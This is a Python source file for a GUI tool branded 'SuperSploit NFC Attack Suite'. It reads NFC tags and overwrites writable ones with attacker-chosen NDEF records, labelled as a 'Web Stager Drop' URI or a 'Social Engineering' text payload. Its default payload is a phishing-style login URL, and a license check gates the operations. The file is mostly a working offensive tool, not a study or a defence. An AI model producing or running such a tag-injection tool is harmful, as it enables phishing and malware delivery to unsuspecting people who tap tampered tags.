import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import sys
import os
import time

try:
    import nfc
    from nfc.clf import RemoteTarget
    import nfc.ndef

    HAS_NFC = True
except ImportError:
    HAS_NFC = False

try:
    from source.core.license_manager import LicenseManager
except ImportError:
    framework_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))
    if framework_root not in sys.path:
        sys.path.append(framework_root)
    try:
        from source.core.license_manager import LicenseManager
    except ImportError:
        class LicenseManager:
            @staticmethod
            def gate_access(f):
                print(f"\n[!] ACCESS DENIED: '{f}' is a SuperSploit Pro feature.")
                print("[*] Standalone license validation failed. Please run via the main CLI.")
                return False


class NFCAttackGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SuperSploit NFC Attack Suite")
        self.root.geometry("750x600")
        
        # Sentry/Modern Dark Color Palette
        self.bg_main = "#181825"
        self.bg_sec = "#1e1e2e"
        self.accent = "#6c5fc7"
        self.accent_hover = "#8a7edb"
        self.fg_main = "#ffffff"
        self.term_bg = "#0d0d14"
        self.term_fg = "#00ffcc"
        
        self.root.configure(bg=self.bg_main)
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Global ttk Style Overhauls
        self.style.configure(".", background=self.bg_main, foreground=self.fg_main, font=("Helvetica", 10))
        self.style.configure("TFrame", background=self.bg_main)
        self.style.configure("TLabelframe", background=self.bg_sec, borderwidth=1, bordercolor=self.bg_main)
        self.style.configure("TLabelframe.Label", background=self.bg_sec, foreground=self.accent, font=("Helvetica", 11, "bold"))
        self.style.configure("TLabel", background=self.bg_sec, foreground=self.fg_main)
        
        # Button, Entry, and Combobox Styling
        self.style.configure("TButton", background=self.accent, foreground="#ffffff", font=("Helvetica", 10, "bold"), borderwidth=0, padding=6)
        self.style.map("TButton", background=[("active", self.accent_hover)])
        self.style.configure("TEntry", fieldbackground="#313244", foreground="#ffffff", borderwidth=0, insertcolor="#ffffff")
        self.style.configure("TCombobox", fieldbackground="#313244", foreground="#ffffff", background=self.bg_sec, borderwidth=0, arrowcolor=self.fg_main)
        self.style.map("TCombobox", fieldbackground=[("readonly", "#313244")], selectbackground=[("readonly", self.accent)], selectforeground=[("readonly", "#ffffff")])
        
        self.is_running = False
        self._build_ui()

    def _build_ui(self):
        main_frame = ttk.Frame(self.root, padding="15")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # NDEF Injection Config
        config_frame = ttk.LabelFrame(main_frame, text=" 📡 Malicious NDEF Payload ", padding="15")
        config_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(config_frame, text="Payload Type:").grid(row=0, column=0, sticky=tk.W, padx=10, pady=5)
        self.payload_type = ttk.Combobox(config_frame, values=["URI (Web Stager Drop)", "Text (Social Engineering)"],
                                         state="readonly", width=25)
        self.payload_type.set("URI (Web Stager Drop)")
        self.payload_type.grid(row=0, column=1, padx=10, pady=5, sticky=tk.W)

        ttk.Label(config_frame, text="Target Data:").grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)
        self.target_data = ttk.Entry(config_frame, width=45, font=("Helvetica", 11))
        self.target_data.insert(0, "https://secure-login-update.com/auth")
        self.target_data.grid(row=1, column=1, padx=10, pady=5, sticky=tk.W)

        # Actions
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X, pady=(0, 10))

        self.read_btn = ttk.Button(btn_frame, text="🔍 READ TAG", command=lambda: self._start_operation("read"))
        self.read_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))

        self.write_btn = ttk.Button(btn_frame, text="💉 INJECT NDEF PAYLOAD",
                                    command=lambda: self._start_operation("write"))
        self.write_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0))

        if not HAS_NFC:
            ttk.Label(main_frame, text="⚠️ 'nfcpy' missing. Running in simulation mode.", foreground="#ffb86c", font=("Helvetica", 10, "bold")).pack(pady=(0, 10))

        # Console
        log_frame = ttk.LabelFrame(main_frame, text=" 🖥️ Hardware Telemetry ", padding="5")
        log_frame.pack(fill=tk.BOTH, expand=True)
        self.console = scrolledtext.ScrolledText(log_frame, bg=self.term_bg, fg=self.term_fg, font=("Consolas", 11), relief=tk.FLAT, padx=10, pady=10)
        self.console.pack(fill=tk.BOTH, expand=True)

    def log(self, msg):
        def _update():
            self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
            self.console.see(tk.END)

        self.root.after(0, _update)

    def _reset_btns(self):
        self.read_btn.config(state=tk.NORMAL)
        self.write_btn.config(state=tk.NORMAL)

    def _start_operation(self, mode):
        # SECURE DRM CHECK: Execute authorization strictly when the user attempts an operation
        if not LicenseManager.gate_access("NFC Attack Suite"):
            messagebox.showerror("License Invalid", "This action requires an active SuperSploit Pro license.")
            return

        # Extract UI data on the main thread to prevent segfaults
        p_type = self.payload_type.get()
        data = self.target_data.get().strip()

        if not data:
            messagebox.showerror("Input Error", "Target data cannot be empty.")
            return

        self.read_btn.config(state=tk.DISABLED)
        self.write_btn.config(state=tk.DISABLED)
        self.console.delete(1.0, tk.END)

        # Pass extracted data cleanly to the background thread
        threading.Thread(target=self._nfc_loop, args=(mode, p_type, data), daemon=True).start()

    def _nfc_loop(self, mode, p_type, data):
        self.log("[*] Initializing NFC hardware interface...")
        self.log("[*] Waiting for target proximity...")

        if not HAS_NFC:
            # Simulation Mode for environments without hardware
            time.sleep(2)
            self.log("[+] Target Tag Detected: UID 04:AA:BB:CC:DD:EE:FF")
            if mode == "read":
                self.log("[*] Dumping Tag Memory...")
                time.sleep(1)
                self.log("[+] NDEF Record Found: URI - https://example.com")
            else:
                self.log(f"[*] Injecting malicious {p_type}...")
                time.sleep(1)
                self.log(f"[+] Successfully wrote payload: {data}")
            self.log("[*] Hardware operation complete.")
            self.root.after(0, self._reset_btns)
            return

        try:
            with nfc.ContactlessFrontend('usb') as clf:
                if mode == "read":
                    tag = clf.connect(rdwr={'on-connect': lambda tag: False})
                    if tag and tag.ndef:
                        for record in tag.ndef.records:
                            # Safely format output depending on record type
                            record_data = getattr(record, 'text', getattr(record, 'uri', str(record)))
                            self.log(f"[+] Found Record: {record.type} -> {record_data}")
                    else:
                        self.log("[-] Tag has no NDEF records or tag dropped.")

                elif mode == "write":
                    def on_connect(tag):
                        if tag.ndef and tag.ndef.is_writeable:
                            # Safely select record type based on user dropdown
                            if "Text" in p_type:
                                record = nfc.ndef.TextRecord(data)
                            else:
                                record = nfc.ndef.UriRecord(data)

                            tag.ndef.records = [record]
                            self.log(f"[+] Payload successfully injected into tag memory.")
                        else:
                            self.log("[-] Target tag is read-only or not NDEF formatted.")
                        return False

                    clf.connect(rdwr={'on-connect': on_connect})

        except Exception as e:
            self.log(f"[-] Hardware error: {e}")

        self.root.after(0, self._reset_btns)


if __name__ == "__main__":
    # DRM check removed from module load. The UI will launch for configuration,
    # but the operations are strictly protected by the LicenseManager.
    root = tk.Tk()
    app = NFCAttackGUI(root)
    root.mainloop()